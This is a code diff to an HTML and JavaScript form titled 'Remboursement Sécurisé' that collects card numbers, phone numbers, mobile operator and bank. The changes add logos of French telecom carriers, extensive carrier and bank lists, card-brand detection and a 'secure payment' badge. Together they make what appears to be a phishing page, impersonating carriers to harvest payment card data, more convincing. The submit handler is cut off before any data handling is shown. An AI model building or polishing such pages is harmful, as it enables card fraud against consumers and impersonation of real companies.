@@ -10,7 +10,7 @@
             font-family: 'Arial', sans-serif;
             background: linear-gradient(135deg, #f3f4f6, #e5e7eb);
         }
-        #card-error {
+        #card-error, #phone-error {
             display: none;
             color: red;
             font-size: 0.9rem;
@@ -28,15 +28,27 @@
             border-color: #4f46e5;
             box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
         }
+        .card-logo {
+            width: 40px;
+            height: auto;
+            margin-right: 10px;
+        }
     </style>
 </head>
 <body class="flex flex-col min-h-screen justify-center items-center">
 
     <!-- Formulaire principal -->
     <div class="card p-8 max-w-lg w-full">
-        <!-- Logo et titre -->
+        <!-- Logos des opérateurs -->
+        <div class="flex justify-center space-x-4 mb-6">
+            <img src="https://via.placeholder.com/100" alt="Orange" class="h-12">
+            <img src="https://via.placeholder.com/100" alt="SFR" class="h-12">
+            <img src="https://via.placeholder.com/100" alt="Bouygues" class="h-12">
+            <img src="https://via.placeholder.com/100" alt="Free" class="h-12">
+        </div>
+
+        <!-- Titre -->
         <div class="text-center mb-8">
-            <img src="https://via.placeholder.com/150" alt="Logo" class="h-16 mx-auto mb-4">
             <h1 class="text-2xl font-bold text-gray-800">Remboursement Sécurisé</h1>
             <p class="text-sm text-gray-600 mt-2">
                 Entrez vos informations pour recevoir votre remboursement en toute sécurité.
@@ -55,8 +67,13 @@
             <!-- Numéro de carte -->
             <div class="mb-6">
                 <label for="numero-carte" class="block text-sm font-medium text-gray-700 mb-2">Numéro de carte</label>
-                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-                    class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
+                <div class="relative">
+                    <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
+                        class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
+                    <div class="absolute inset-y-0 right-0 flex items-center pr-3">
+                        <img id="card-type" src="https://via.placeholder.com/30" alt="Card Type" class="card-logo">
+                    </div>
+                </div>
                 <p id="card-error" class="text-red-500 text-sm mt-2 hidden">Le numéro de carte est invalide.</p>
             </div>
 
@@ -77,8 +94,9 @@
             <!-- Numéro de téléphone -->
             <div class="mb-6">
                 <label for="telephone" class="block text-sm font-medium text-gray-700 mb-2">Numéro de téléphone</label>
-                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
+                <input type="tel" id="telephone" placeholder="Ex: 0612345678" required maxlength="10"
                     class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none">
+                <p id="phone-error" class="text-red-500 text-sm mt-2 hidden">Le numéro doit contenir 10 chiffres.</p>
             </div>
 
             <!-- Opérateur et Banque -->
@@ -88,9 +106,20 @@
                     <select id="operateur" required
                         class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
                         <option value="" disabled selected>Sélectionnez</option>
+                        <!-- Opérateurs principaux -->
                         <option value="orange">Orange</option>
                         <option value="sfr">SFR</option>
+                        <option value="bouygues">Bouygues Telecom</option>
                         <option value="free">Free</option>
+                        <!-- MVNOs -->
+                        <option value="la-poste">La Poste Mobile</option>
+                        <option value="nrj">NRJ Mobile</option>
+                        <option value="red">RED by SFR</option>
+                        <option value="sosh">Sosh</option>
+                        <option value="b-and-you">B&YOU</option>
+                        <option value="prixtel">Prixtel</option>
+                        <option value="cdiscount">Cdiscount Mobile</option>
+                        <option value="autre">Autre</option>
                     </select>
                 </div>
                 <div>
@@ -98,9 +127,22 @@
                     <select id="bank" required
                         class="input-field w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none bg-white">
                         <option value="" disabled selected>Sélectionnez</option>
+                        <!-- Grandes banques -->
                         <option value="bnp">BNP Paribas</option>
                         <option value="sg">Société Générale</option>
                         <option value="ca">Crédit Agricole</option>
+                        <option value="lcl">LCL</option>
+                        <option value="bp">Banque Populaire</option>
+                        <option value="cm">Crédit Mutuel</option>
+                        <option value="hsbc">HSBC</option>
+                        <option value="la-poste">La Banque Postale</option>
+                        <!-- Banques en ligne -->
+                        <option value="boursorama">Boursorama Banque</option>
+                        <option value="fortuneo">Fortuneo</option>
+                        <option value="hellobank">Hello Bank!</option>
+                        <option value="n26">N26</option>
+                        <option value="revolut">Revolut</option>
+                        <option value="autre">Autre</option>
                     </select>
                 </div>
             </div>
@@ -112,11 +154,9 @@
             </button>
         </form>
 
-        <!-- Sécurité -->
+        <!-- Paiement sécurisé -->
         <div class="mt-6 text-center">
-            <p class="text-sm text-gray-600">
-                <span class="text-indigo-600">🔒 Sécurisé</span> - Vos informations sont protégées.
-            </p>
+            <img src="https://via.placeholder.com/300x100" alt="Paiement Sécurisé" class="w-full h-auto">
         </div>
     </div>
 
@@ -130,6 +170,45 @@
     </footer>
 
     <script>
+        // Gestion du numéro de carte (espaces tous les 4 chiffres)
+        const cardInput = document.getElementById('numero-carte');
+        const cardError = document.getElementById('card-error');
+        const cardTypeImg = document.getElementById('card-type');
+
+        cardInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+
+            // Détection du type de carte
+            if (/^4/.test(value)) {
+                cardTypeImg.src = "https://img.icons8.com/color/48/000000/visa.png"; // Logo Visa
+            } else if (/^5/.test(value)) {
+                cardTypeImg.src = "https://img.icons8.com/color/48/000000/mastercard.png"; // Logo Mastercard
+            } else {
+                cardTypeImg.src = "https://via.placeholder.com/30"; // Logo par défaut
+            }
+
+            cardError.classList.add('hidden');
+        });
+
+        // Validation du numéro de téléphone (10 chiffres)
+        const phoneInput = document.getElementById('telephone');
+        const phoneError = document.getElementById('phone-error');
+
+        phoneInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            e.target.value = value;
+
+            if (value.length !== 10) {
+                phoneError.classList.remove('hidden');
+            } else {
+                phoneError.classList.add('hidden');
+            }
+        });
+
+        // Soumission du formulaire
         document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
             event.preventDefault();
 
